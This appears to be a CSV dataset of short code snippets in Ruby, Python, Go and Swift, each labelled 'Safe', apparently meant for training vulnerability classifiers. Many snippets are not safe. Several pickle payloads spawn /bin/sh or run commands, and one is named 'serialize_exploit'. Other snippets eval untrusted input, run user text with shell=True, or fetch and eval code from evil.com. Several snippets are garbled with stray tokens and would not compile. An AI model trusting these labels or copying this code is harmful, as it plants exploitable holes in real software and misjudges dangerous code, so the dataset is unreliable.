snippet,label,source
"class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end
end

class Admin < User
  def change_username(new_name)
    self.name = new_name
  end
end

u1 = User.new(""John"")
a1 = Admin.new(""John"")
a1.change_username(""Alice"")
puts a1.name",Safe,ayshajavd_hf_labeled_dataset
"require 'yaml'
require 'psych'

class User
  attr_accessor :name, :email

  def initialize(name, email)
    @name = name
    @email = email
  end
end

def load_user_data(file_path)
  data = File.read(file_path)
  Psych.safe_load(data, [Symbol])
end

user_data = load_user_data('untrusted_data.yml')
user = User.new(user_data[:name], user_data[:email])
puts ""Welcome #{user.name}!""",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

func processUserInput(input: String, bufferSize: Int) -> String? {
    guard let buffer = Array<Character>(repeating: "" "", count: bufferSize) else {
        return nil
    }
    
    let inputArray = Array(input)
    let copyCount = min(inputArray.count, buffer.count)
    
    buffer.indices.forEach { buffer[$0] = inputArray[$0] }
    
    return String(buffer)
}

let userInput = ""This is a long string that will cause a buffer overflow""
if let processedInput = processUserInput(input: userInput, bufferSize: 100) {
    print(processedInput)
} else {
    print(""Failed to create buffer"")
}",Safe,ayshajavd_hf_labeled_dataset
"def secure_function(user_input):
    max_length = 100
    if len(user_input) > max_length:
        raise ValueError(""Input too long"")
    buffer = bytearray(max_length)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer

# Attacker controlled input
attacker_input = ""A"" * 200
try:
    print(secure_function(attacker_input))
except ValueError as e:
    print(e)",Safe,ayshajavd_hf_labeled_dataset
"class Secure
  def initialize(input)
    @user_input = input
  end

  def eval_user_input
    begin
      eval(@user_input)
    rescue SecurityError => e
      puts ""SecurityError: #{e}""
    end
  end
end

secure = Secure.new(""puts 'Hello World'"")
secure.eval_user_input",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""errors""
	""fmt""
)

type User struct {
	Name string
}

func getUser(id int) (*User, error) {
	if id <= 0 {
		return nil, errors.New(""Invalid ID"")
	}
	return &User{Name: ""John Doe""}, nil
}

func main() {
	user, err := getUser(-1)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Checking for nil pointer before dereferencing
	if user == nil {
		fmt.Println(""User is nil"")
		return
	}

	fmt.Println(user.Name)
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""log""
)

type User struct {
	Name string
}

func getUser() (*User, error) {
	return &User{Name: ""John Doe""}, nil
}

func main() {
	u, err := getUser()
	if err != nil {
		log.Fatalf(""Error occurred: %v"", err)
	}
	fmt.Println(u.Name)
}",Safe,ayshajavd_hf_labeled_dataset
"import sys

def create_large_list():
    large_list = []
    for _ in range(10**3): # Generate 10^3 smaller lists instead of one large list
        small_list = [""a""*10**6]
        large_list += small_list
    return large_list

def main():
    large_list = create_large_list()
    print(f'Size of the list in bytes: {sys.getsizeof(large_list)}')

if __name__ == ""__main__"":
    main()",Safe,ayshajavd_hf_labeled_dataset
"def check_input(input)
  regex = /\A[a-zA-Z0-9]*\z/
  return regex.match?(input)
end

puts ""Enter your input:""
user_input = gets.chomp

if check_input(user_input)
  puts ""Input is valid.""
else
  puts ""Invalid input.""
end",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""os""
	""time""
)

func main() {
	file, closer := openFile(""data.txt"")
	defer closer()
	for i := 0; i < 10; i++ {
		writeToFile(file, fmt.Sprintf(""Line %d\n"", i))
		time.Sleep(time.Second)
	}
}

func openFile(name string) (*os.File, func()) {
	file, err := os.OpenFile(name, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	closer := func() {
		err := file.Close()
		if err != nil {
			fmt.Println(""Error closing file:"", err)议
		}
	}
	return file, closer
}

func writeToFile(file *os.File, data string) {
	_, err := file.WriteString(data)
	if err != nil {
		panic(err)
	}
}",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

func processUserInput(userInput: String) -> String? {
    guard let escapedUserInput = userInput.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
          let sanitizedUserInput = String(describing: escapedUserInput) else {
        return nil
    }
    
    let task = Process()
    task.launchPath = ""/bin/sh""
    task.arguments = [""-c"", sanitizedUserInput]
    
    let outputPipe = Pipe()
    task.standardOutput = outputPipe
    task.standardError = outputPipe
    
    task.launch()
    
    let data = outputPipe.fileHandleForReading.readDataToEndOfFile()
    if let output = String(data: data, encoding: .utf8) {
        return output
    } else {
        return nil
    }
}

guard let userInput = CommandLine.arguments.last else {
    print(""No user input provided."")
    exit(1)
}

if let result = processUserInput(userInput: userInput) {
    print(result)
} else {
    print(""Failed to process user input."")
}",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import os
import subprocess

class RCE:
    def __reduce__(self):
        # Use subprocess instead of os.system for security reasons
        return (subprocess.Popen, ('cmd /c calc',),)

def serialize(obj):
    return pickle.dumps(obj)

def deserialize(serialized_data):
    # Use pickle.loads with protocol=2 to avoid vulnerability
    return pickle.loads(serialized_data, encoding='bytes')

# Secure optimized code
deserialize(serialize(RCE()))",Safe,ayshajavd_hf_labeled_dataset
"require 'open-uri'
require 'net/http'
require 'uri'

def fetch_data(url)
  uri = URI.parse(url)
  raise ArgumentError, 'Invalid URL' unless uri.is_a?(URI::HTTP)
  
  response = Net::HTTP.get_response(uri)
  raise StandardError, 'Failed to fetch data' unless response.is_a?(Net::HTTPSuccess)
  
  response.body
end

def process_data(data)
  # Use a whitelist approach for allowed characters
  allowed_chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a + [' ', '.', '+', '-', '*', '/']
  sanitized_data = data.chars.select { |char| allowed_chars.include?(char) }.join
  
  eval(sanitized_data)
end

begin
  url = ""http://evil.com/malicious_code.txt""
  data = fetch_data(url)
  process_data(data)
rescue => e
  puts ""An error occurred: #{e.message}""
end",Safe,ayshajavd_hf_labeled_dataset
"import ast

class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node

def user_input():
    return input(""Enter something: "")

def safe_eval(user_input):
    tree = compile(user_input, filename=""<input>"", mode=""eval"")
    transformer = RestrictedPython()
    new_tree = transformer.visit(tree)
    code = compile(new_tree, filename=""<input>"", mode=""exec"")
    exec(code)

if __name__ == ""__main__"":
    user_input = user_input()
    safe_eval(user_input)",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import subprocess

class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'safe command'],))

pickled = pickle.dumps(SafePickle())
pickle.loads(pickled)",Safe,ayshajavd_hf_labeled_dataset
"require 'open3'

def execute_command(user_input)
  command = ""ls""
  if user_input.match?(/^[a-zA-Z0-9_\-\/]+$/)
    command += "" #{user_input}""
  else
    puts ""Invalid input. Only alphanumeric characters, underscore, dash and slash are allowed.""
    return
  end
  
  stdout, stderr, status = Open3.capture3(command)
  puts stdout
end

puts ""Enter your command:""
user_input = gets.chomp
execute_command(user_input)",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""strconv""
	""unicode""
)

func main() {
	str := ""10A"" // This is a string containing an integer and a character
	isValid := true
	for _, c := range str {
		if !unicode.IsDigit(c) {
			isValid = false
			break
		}
	}
	if !isValid {
		fmt.Println(""Error during conversion: String contains non-integer characters."")
	} else {
		num, _ := strconv.Atoi(str) // We can safely ignore the error here as we have already checked for non-integer characters
		fmt.Println(""Converted number:"", num)Bs
	}
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""bufio""
	""errors""
	""fmt""
	""os""
	""os/exec""
	""strings""
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(""Enter your command: "")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSuffix(input, ""\n"")

	err := runCommand(input)
	if err != nil {
		fmt.Println(err)
	}
}

func runCommand(command string) error {
	args := strings.Fields(command)
	if len(args) == 0 {
		return errors.New(""No command provided"")
	}

	cmd := exec.Command(args[0], args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		return fmt.Errorf(""Failed to execute command: %w"", err)
	}

	return nil
}",Safe,ayshajavd_hf_labeled_dataset
"def execute_command(user_input)
  sanitized_input = Shellwords.escape(user_input)
  system(""grep -r '#{sanitized_input}' /"")
end

puts ""Enter your input:""
user_input = gets.chomp
execute_command(user_input)",Safe,ayshajavd_hf_labeled_dataset
"import sqlite3

def get_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    # Use parameterized query to prevent SQL injection
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user = cursor.fetchone()
    return user

# Testing the function
print(get_user(""admin""));",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""log""
	""strconv""
)议
func main() {
	input := ""not a number""
	value, err := strconv.Atoi(input)
	if err != nil {
		log.Fatalf(""Failed to convert string to int: %v"", err)
	}
	fmt.Println(value)
}",Safe,ayshajavd_hf_labeled_dataset
"require 'sinatra'

ALLOWED_METHODS = %w[upcase downcase capitalize]

def safe_eval(code)
  begin
    return unless ALLOWED_METHODS.include?(code)
    ""hello"".send(code)
  rescue => e
    return ""Error: #{e.message}""
  end
end

get '/' do
  safe_eval(params[:code])
end HawkAI:",Safe,ayshajavd_hf_labeled_dataset
"class User
  attr_accessor :name
  
  def initialize(name)
    @name = sanitize(name)
  end

  private

  def sanitize(input)
    input.gsub(/[^0-9A-Za-z]/, '')
  end
end

def greeting(user)
  puts ""Hello #{user.name}""
end

puts ""Enter your name:""
input = gets.chomp
user = User.new(input)
greeting(user)",Safe,ayshajavd_hf_labeled_dataset
"import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.form.get('data')
    if data:
        # Sanitize the input by removing any potential shell commands
        sanitized_data = """".join(e for e in data if e.isalnum())
        # Use subprocess instead of os.system to prevent command injection
        subprocess.Popen(sanitized_data, shell=True)

if __name__ == '__main__':
    app.run()",Safe,ayshajavd_hf_labeled_dataset
"import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    if command:
        # Sanitize the command before executing it
        sanitized_command = """".join(e for e in command if e.isalnum())
        # Use subprocess instead of os.system to prevent command injection
        process = subprocess.Popen(sanitized_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode == 0:
            return 'Command executed'
        else:archar
            return 'Command execution failed'
    else:
        return 'No command provided'

if __name__ == '__main__':
    app.run(debug=True)",Safe,ayshajavd_hf_labeled_dataset
"import ast

class ExpressionVisitor(ast.NodeVisitor):
    def visit(self, node):
        if type(node).__name__ not in ['Expression', 'Num', 'BinOp', 'UnaryOp']:
            raise ValueError('Invalid expression')
        super().visit(node)

def evaluate_expression(expression):
    tree = ast.parse(expression, mode='eval')
    ExpressionVisitor().visit(tree)
    result = eval(compile(tree, '', mode='eval'))
    return result

try:
    user_input = input(""Enter an expression: "")
    print(evaluate_expression(user_input))
except Exception as e:
    print(f""Invalid expression: {e}"")",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""runtime/debug""
	""time""
)

type Resource struct {
	data []byte
}

func main() {
	var resources []*Resource
	for i := 0; i < 1000000; i++ {
		resources = append(resources, &Resource{data: make([]byte, 1024)})
	}

	// Simulate long-running process that doesn't free up memory
	time.Sleep(5 * time.Minute)

	// Explicitly call the garbage collector to clean up
	debug.FreeOSMemory()
}",Safe,ayshajavd_hf_labeled_dataset
"import sqlite3

def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    
    # Use parameter substitution to avoid SQL injection
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    
    user_info = cursor.fetchone()
    return user_info

# Testing the function
print(get_user_info(""john""))",Safe,ayshajavd_hf_labeled_dataset
"import subprocess

def execute_command(user_input):
    command = ['bash', '-c', f""echo -n {user_input} | wc -c""]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout.strip())

while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)",Safe,ayshajavd_hf_labeled_dataset
"def user_input(input)
  puts input
end

user_input('Hello, World')",Safe,ayshajavd_hf_labeled_dataset
"def safe_method(user_input)
  begin
    puts eval(user_input)
  rescue SecurityError => e
    puts ""SecurityError: #{e}""
  rescue SyntaxError => e
    puts ""SyntaxError: #{e}""
  end
end

puts ""Enter some Ruby code:""
user_input = gets.chomp

safe_method(user_input)",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import subprocess

class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    return malicious

def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)

if __name__ == '__main__':
    serialized_exploit = serialize_exploit()
    deserialize_exploit(serialized_exploit)",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""os""
)

func main() {
	file, err := os.Open(""nonexistent.txt"")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer func() {
		if err = file.Close(); err != nil {
			fmt.Println(""Failed to close file:"", err)
		}
	}()
}",Safe,ayshajavd_hf_labeled_dataset
"def evaluate_input(user_input)
  begin
    # Safely evaluate user input using instance_eval method instead of eval
    Object.new.instance_eval { eval user_input }
  rescue Exception => e
    puts ""An error occurred: #{e.message}""
  end
end

puts ""Enter some Ruby code to evaluate:""
user_input = gets.chomp
evaluate_input(user_input)",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

class SecureClass {
    private var buffer: [Int8] = Array(repeating: 0, count: 10)
    
    func writeToBuffer(_ data: Int8, _ position: Int) {
        guard position >= 0 && position < buffer.count else {
            print(""Trying to write out of buffer bounds"")
            return
        }
        
        buffer[position] = data
    }
    
    func readFromBuffer(_ position: Int) -> Int8? {
        guard position >= 0 && position < buffer.count else {
            print(""Trying to read out of buffer bounds"")
            return nil
        }
        
        return buffer[position]
    }
}

let instance = SecureClass()
instance.writeToBuffer(127, 10) // This will not cause buffer overflow
instance.readFromBuffer(10) // This will not cause buffer overflow",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

class User {
    var name: String?
}

func printUserName(user: User?) {
    if let user = user, let name = user.name {
        print(""User's name is \(name)"")
    } else {
        print(""No user found."")
    }
}

let user = User()
printUserName(user: user)",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import subprocess

class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', ""You have been hacked!""],))

data = pickle.dumps(SafePickle())
pickle.loads(data)",Safe,ayshajavd_hf_labeled_dataset
"def match_input(input)
  regex = /^a+$/
  return regex.match?(input)
end

puts ""Enter input:""
user_input = gets.chomp

if match_input(user_input)
  puts ""Match found!""
else
  puts ""No match found.""
end",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

enum MyError: Error {
    case invalidInput(String)
    case unknown
}

func safeReadFileContent() throws -> String {
    do {
        let fileURL = URL(fileURLWithPath: ""/path/to/file"")
        let fileContent = try String(contentsOf: fileURL, encoding: .utf8)
        return fileContent
    } catch let error as Swift.Error {
        if error.localizedDescription == ""The file “/path/to/file” doesn’t exist."" {
            throw MyError.invalidInput(""Failed to read file"")
        } else {
            throw MyError.unknown
        }
    }
}

do {
    let result = try safeReadFileContent()
    print(result)
} catch let error as MyError {
    switch error {
    case .invalidInput(let message):
        print(""Invalid input: \(message)"")
    case .unknown:
        print(""Unexpected error: Unknown error occurred."")
    }
} catch {
    print(""Unexpected error: \(error)"") covered by the unknown case in the enum.
}",Safe,ayshajavd_hf_labeled_dataset
"class UserController < ApplicationController
  before_action :set_user, only: [:update]

  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  def update
    if @user.update(user_params)
      redirect_to @user
    else
      render 'edit'
    end
  end

  private

  def set_user
    @user = User.find(params[:id])
  end

  def user_params
    params.require(:user).permit(:attribute1, :attribute2, ...) # replace attribute1, attribute2, ... with actual attributes
  end
end",Safe,ayshajavd_hf_labeled_dataset
"import sqlite3

def search_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()妆
    query = ""SELECT * FROM users WHERE username=?""
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    return user

# Testing the function
print(search_user(""test')) OR '1'='1"";--""))",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

func processData(_ data: [Int]) -> [Int] {
    var buffer = [Int](repeating: 0, count: data.count + 1)
    buffer.removeLast()
    buffer.append(contentsOf: data)
    return buffer
}

let data = [1, 2, 3, 4, 5]
let result = processData(data)
print(result)",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""os""
) far

func main() {
	if len(os.Args) < 2 {
		fmt.Println(""No input provided"")
		return
	}

	userInput := os.Args[1]
	fmt.Println(userInput)
}",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

class MyClass {
    private var myArray = [Int]()
    
    func addValue(value: Int) {
        self.myArray.append(value)ivalue)
    }
    
    deinit {
        print(""MyClass instance is being deinitialized"")
    }
}

var instance: MyClass? = MyClass()

for _ in 0..<1_000_000 {
    instance?.addValue(value: 1)
}

instance = nil",Safe,ayshajavd_hf_labeled_dataset
"class GlobalVariable
  attr_accessor :global_variable

  def initialize
    @global_variable = []
  end

  def add_to_global(item)
    @global_variable << item
  end

  def clear_global
    @global_variable = []
  end
end

global_var = GlobalVariable.new

100000.times do |i|
  global_var.add_to_global(i)
  global_var.clear_global if i % 1000 == 0
end",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import os
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.run, (['id'], capture_output=True, text=True))

rce = RCE()
pickled = pickle.dumps(rce)
result = pickle.loads(pickled)
print(result.stdout)",Safe,ayshajavd_hf_labeled_dataset
"import ast

class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Function call not allowed')
        ast.NodeVisitor.generic_visit(self, node)

def run_user_input():
    user_input = input(""Enter your command: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    for stmt in ast.walk(tree):
        if not isinstance(stmt, (ast.Expr, ast.Assign)):
            raise SyntaxError('Only simple statements are allowed')
    restricted_python = RestrictedPython()
    restricted_python.visit(tree)
    exec(tree)

run_user_input()",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import subprocess

class TestClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""pwned""', '>', '/tmp/pwn.txt'],))

data = pickle.dumps(TestClass())

print(pickle.loads(data))",Safe,ayshajavd_hf_labeled_dataset
"import Foundation

class MyClass {
    let myStrongReference: String
    
    init() {
        self.myStrongReference = ""Hello, World!""
    }
    
    func printMyString() {
        print(myStrongReference)
    }
}

let myInstance: MyClass = MyClass()
myInstance.printMyString()",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""strconv""
) offering

func main() {
	str := ""not a number""
	if num, err := strconv.Atoi(str); err == nil {
		fmt.Println(num)
	}
}",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import subprocess

class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pkl', 'wb') as f:
        pickle.dump(malicious, f)

if __name__ == ""__main__"":
    serialize_exploit()",Safe,ayshajavd_hf_labeled_dataset
"import pickle
import os
import subprocess

class EvilClass(object):
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'Hacked!'],))

def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)Bs

def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

serialize_and_write(EvilClass(), '/tmp/malicious.pkl')
read_and_deserialize('/tmp/malicious.pkl')",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""bufio""
	""fmt""
	""os""
)

func main() {
	reader := bufio.NewReaderSize(os.Stdin, 1024)
	for {
		buffer, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Print(buffer)
	}
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""sync""
)

type Counter struct {
	sync.Mutex
	value int
}

func (c *Counter) Increment(wg *sync.WaitGroup) {
	c.Lock()
	defer c.Unlock()
	defer wg.Done()
	for i := 0; i < 1000; i++ {
		c.value++
	}
}

func main() {
	var wg sync.WaitGroup
	c := &Counter{}

	for i := 0; i < 20; i++ {
		wg.Add(1)
		go c.Increment(&wg)
	}

	wg.Wait()
	fmt.Println(""Counter value:"", c.value)
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""strings""
	""unsafe""
)

func main() {
	str := ""Hello, World!""
	bytes := []byte(str)

	// Unsafe conversion from string to byte slice
	ptr := unsafe.Pointer(&bytes[0])

	// Modify the string through the byte slice
	*(*byte)(ptr) = 'h'
	*(*byte)(unsafe.Pointer(uintptr(ptr) + 1)) = 'e'
	*(*byte)(unsafe.Pointer(uintptr(ptr) + 2)) = 'l'
	*(*byte)(unsafe.Pointer(uintptr(ptr) + 3)) = 'l'
	*(*byte)(unsafe.Pointer(uintptr(ptr) + 4)) = 'o'

	fmt.Println(string(bytes)) // Outputs: hello, World
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""bufio""
	""fmt""
	""os""
	""strings""
)

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print(""Enter your name: "")
	name, _ := reader.ReadString('\n')

	// Trim leading and trailing white spaces
	name = strings.TrimSpace(name)

	// Validate and sanitize user input
	if len(name) > 0 && len(name) <= 256 {
		fmt.Println(""Hello, "" + name)
	} else {
		fmt.Println(""Invalid input"")
	}
}",Safe,ayshajavd_hf_labeled_dataset
"package main

import (
	""net/http""
	""fmt""
	""strings""
)

// This function validates the URL before redirecting
func redirectHandler(w http.ResponseWriter, r *http.Request) {
	location := r.URL.Query().Get(""location"")
	if location == """" {
		location = ""/default""
	}
	// Validate the URL before redirecting
	if !strings.HasPrefix(location, ""http://"") && !strings.HasPrefix(location, ""https://"") {
		http.Error(w, ""Invalid URL"", http.StatusBadRequest)
		return
	}
	http.Redirect(w, r, location, http.StatusFound)
}

func defaultHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, ""Welcome to the default page"") offering a welcome message
}

func main() {
	http.HandleFunc(""/redirect"", redirectHandler)
	http.HandleFunc(""/default"", defaultHandler)
	http.ListenAndServe("":8080"", nil)
}",Safe,ayshajavd_hf_labeled_dataset
